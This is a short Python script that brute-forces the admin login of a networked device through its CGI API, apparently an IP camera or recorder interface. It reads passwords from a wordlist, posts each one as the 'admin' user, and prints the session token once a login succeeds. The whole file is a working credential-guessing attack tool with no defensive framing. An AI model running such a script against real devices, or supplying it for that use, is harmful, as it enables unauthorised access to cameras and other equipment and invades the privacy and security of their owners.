import requests
import json
import sys
import time

# Function to generate a token
def get_token(ip, username, password):
    try:
        # Sending a POST request to the server
        r = requests.post(f"http://{ip}/cgi-bin/api.cgi?cmd=Login&token=null", 
                          json=[{"cmd": "Login", "action": 0, "param": {"User": {"userName": username, "password": password}}}])

        # Checking if the response has a status 200 (success)
        if r.status_code != 200:
            print(f"Error: Received HTTP {r.status_code} during authentication attempt.")
            return None

        # Attempt to parse the response and find the token
        try:
            token = json.loads(r.text)[0]["value"]["Token"]["name"]
            return token
        except (KeyError, IndexError, json.JSONDecodeError):
            return None

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return None

# Function to load passwords from a file
def load_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()  # Reads each line as a separate password
    return passwords

# Main program function
def main(ip, password_file):
    username = "admin"  # The username is constant
    passwords = load_passwords(password_file)  # Load the list of passwords from the file

    print(f"Starting login attempts on device {ip}...")
    
    for password in passwords:
        print(f"Attempting login with password: {password}")
        token = get_token(ip, username, password)
        
        if token:
            print(f"Token successfully generated: {token}")
            break  # Stop once the correct password is found and a token is obtained
        else:
            print("Login failed. Trying the next password.")
            time.sleep(3)
            

if __name__ == "__main__":
    # Checking if the required arguments are provided
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <device_IP> <password_file_path>")
        sys.exit(1)

    ip = sys.argv[1]  # Device IP address
    password_file = sys.argv[2]  # Path to the file with passwords
    
    main(ip, password_file)

